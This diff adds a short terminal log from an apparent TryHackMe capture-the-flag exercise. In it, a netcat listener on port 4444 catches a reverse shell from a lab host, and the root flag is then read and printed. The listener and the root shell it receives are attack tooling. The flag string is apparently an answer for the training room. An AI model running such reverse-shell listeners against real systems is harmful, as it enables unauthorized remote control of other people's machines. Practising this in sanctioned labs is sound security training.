@@ -1,0 +1,13 @@
+┌──(kali㉿kali)-[~/GitHub/TryHackMe]                           
+└─$ nc -lvnp 4444              
+listening on [any] 4444 ...    
+connect to [10.6.85.73] from (UNKNOWN) [10.10.177.15] 35580    
+bash: cannot set terminal process group (1095): Inappropriate ioctl for device                                                
+bash: no job control in this shell                             
+root@tbfc-ftp-01:~# cat /root/flag.txt                         
+cat /root/flag.txt             
+THM{even_you_can_be_santa}     
+root@tbfc-ftp-01:~# exit       
+
+┌──(kali㉿kali)-[~/GitHub/TryHackMe]                           
+└─$                            
